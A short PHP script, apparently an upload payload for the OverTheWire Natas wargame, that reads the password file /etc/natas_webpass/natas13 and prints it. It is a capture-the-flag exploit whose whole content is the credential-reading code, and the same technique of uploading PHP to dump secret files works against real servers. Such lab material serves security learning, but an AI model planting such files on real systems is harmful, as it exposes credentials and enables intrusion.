
<?php
$filename = '/etc/natas_webpass/natas13';

$content = file_get_contents($filename);

if ($content !== false) {
    echo $content;
} else {
    echo "Error: Could not read file.";
}
?>